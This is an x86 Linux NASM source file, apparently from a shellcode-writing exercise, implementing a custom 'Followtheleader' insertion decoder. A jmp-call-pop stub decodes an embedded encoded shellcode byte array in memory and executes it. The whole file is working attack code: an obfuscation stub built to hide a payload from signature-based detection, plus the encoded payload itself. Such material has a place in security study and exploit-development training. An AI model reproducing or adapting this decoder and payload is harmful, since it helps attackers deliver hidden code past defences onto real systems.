; Filename: Followtheleader-decoder.nasm
; Author:  Konstantinos Alexiou
; Description: Followtheleader custom insertion Encoder, Linux Intel/x86
 
global _start           
section .text
 
_start:
    jmp short call_shellcode

decoder:
    pop esi             	 ; Address of EncodedShellcode to ESI
    lea edi, [esi]               ; Load effective address of what is contained on EDI
    xor ecx, ecx   		 ; Zero ECX
    mul ecx 			 ; This instruction will cause both EAX and EDX to become zero
    xor ebp, ebp            	 ; Zero the value on EBP 
    mov dl, byte [esi]           ; Put the LEADER byte to EDX (DL) 
  
;(firstb - secondb) CALCULATION  
    mov al, dl                   ; Copy the LEADER to EAX
  
    ;firstb extraction of LEADER
    shr dl, 4                    ; Keep only the 4 high bits of LEADER to DL (if Leader=ac then DL=a) [firstb]
   
    ;secondb extraction of LEADER
    shl eax, 28                  ; shift left 28 bits of EAX which contains the value of Leader on al
    shr eax, 28                  ; shift right 28 of EAX (if EAX=0xc0000000 now EAX=0x0000000c) [secondb]
    sub dl, al                   ; (firstb - secondb) value stored to EDX (DL)
    jns decode_pr    

negative:			 ; Calculate the absolute value if negative or 
    not dl
    inc dl


;decode process
decode_pr:

    xor eax, eax                
    xor ebx, ebx
    xor ecx, ecx

    mov al, byte [esi+1+ebp]	 ; Put the encoded byte to EAX
    mov ecx, ebp         	 ; EBP is used as a counter copy the value of EBP to ECX
    xor cl, 0x32	         ; At the end of the shellcode EBP should point 50 in decimal 32 in hex
    je short EncodedShellcode   
  
    ;rev_suplx Calculation
    mov cl, al			 ; Put the Encoded byte to EAX (xxx to EAX)
    sub cl, dl          	 ; rev_suplx= xxx-(firstb - secondb) value stored to CL
    mov bl, cl          	 ; Keep Backup of rev_suplx to BL
    mov al, cl          	 ; Second backup of CL   
    
    ;Revert the bytes on rev_suplx 
    shr bl, 4                    ; shift 4 bits right (if was bl=ec now bl=e)
    shl eax, 28                  ; shift left 28 bits of EAX which contains the value of rev_supl on cl( if EAX was 0xec now EAX=0xc0000000) 
    shr eax, 24                  ; shift right 24 of EAX (if EAX=0xc0000000 now EAX=0x000000c0)
    add eax, ebx                 ; add the value on EBX to EAX (if EAX=0x000000c0 + BL=0xe, EAX=0x0000000ce)
 
    ;Supplement Calculation
    mov bl, 0xff                 ; Value of  0xff to BL
    sub bl, al                   ; Calculate the Supplement
    mov byte [edi], bl           ; Put the decoded byte to the position of EDI
    inc edi                      ; EDI is a pointer to the position which the decoded bytes will be stored
    add ebp,0x2			 ; The EBP is a counter values will be (2,4,6,..50)

    jmp short decode_pr		 ; Goto the decode process to decode the next bytes		
 
call_shellcode:
    call decoder
    EncodedShellcode: db 0x40,0xf0,0x37,0xf7,0x15,0xfe,0xe0,0x7d,0x20,0x11,0xb5,0x11,0x37,0xcc,0x36,0x7d,0xf3,0x7d,0x61,0x11,0xac,0xdd,0x87,0x6d,0xb0,0x1d,0x6f,0x6b,0x2,0xc5,0xe0,0xfe,0xbe,0x6b,0xc1,0xd5,0xc3,0xce,0x39,0x6b,0xeb,0xe5,0xfe,0xf8,0x29,0x53,0xf8,0x27,0x16,0xfb,0xe9 
